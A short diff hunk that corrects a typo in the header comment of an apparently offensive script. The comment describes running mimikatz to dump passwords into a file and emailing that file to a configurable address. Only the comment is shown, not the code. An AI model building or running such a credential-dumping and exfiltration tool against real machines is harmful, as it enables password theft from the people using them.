@@ -1,6 +1,6 @@
 /********************************************************************************
 Run mimikatz and dup passwords into file
-Change line 22 ('Desktop') to location you wnat file saved
+Change line 22 ('Desktop') to location you want file saved
 Change line 30 'Username', ;Password', From email, To Email to your email
 Change line 49 to set location file was saved
 BY: C4PT14ND34DP00L
